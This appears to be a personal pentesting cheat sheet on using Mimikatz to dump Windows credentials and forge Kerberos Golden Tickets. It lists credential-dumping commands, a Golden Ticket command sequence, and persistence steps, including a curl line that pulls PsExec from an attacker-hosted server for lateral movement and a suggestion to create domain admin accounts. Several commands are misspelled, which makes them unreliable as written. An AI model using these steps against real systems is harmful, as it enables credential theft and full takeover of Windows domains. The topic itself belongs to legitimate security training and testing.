# [Mimikatz](https://www.varonis.com/blog/what-is-mimikatz/)

Tool used to view and streal credentials, generate Kerberos tickets, and leverage attacks.

Dumps credentials stored in memory

pirvilege::debug
   
   - We want to see "20 OK"
   
   - This is to check that we can bypass memory protection

sekurlsa::logonpasswords

  - Can get users NTLM hash, and more

  - Notes:

        wdigest: Old way Windows stored passwords in memory from 7 and prior. Passwords were stored in clear text here. 8+ fixed this to be hashed by turing off the feature. Mimikatz can turn it back on. Once back on a new logon session will be need to occur.

lsadump::sam /patch

lsadump::lsa /patch


# Golden Ticket Attack

If you obtain the hash for the account that creates Kerberos tickets, then we can generate KTGT.
If this is achieved we have complete access to the domain and every machine.

**Exploit**

    lsadump::lda /inject /name:<kerberos ticket granting account>
    
     You want to grab the SID of the domian and the NTLM hash of the account.
     
    kerberose::golden /User:<account name, existing or not> /domain:<domian> /sid:<domain SID> /<kerberos TGT account name>:<NTLM hash> /id:500 /ptt
    
      /id   #account RID
      
      /ptt  #Pass the hash
      
      
     If successful run:
     
     misc:cmd
     
   You now have an admin shell on the domain controller. Here are a few followups for persistence:
   
   - Interact with machines
   
         <command> \\<ip>\c$
         
   - Upload [psexec.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/psexechttps://docs.microsoft.com/en-us/sysinternals/downloads/psexec
   ) to get full shells on other domain systems.
   
        Python web server on attacker under /user/share/windows-binaries. 
        
        Then on windows:
             
         curl http://<ip>:8000/PsExec.exe -O psexec.exe    
   
         psexec.exe \\<machine name or IP> cmd.exe  #run in golden ticket shell
         
         Note that this can take a while
   
   - Create a domain admin account
   
   - Create silver ticket
      
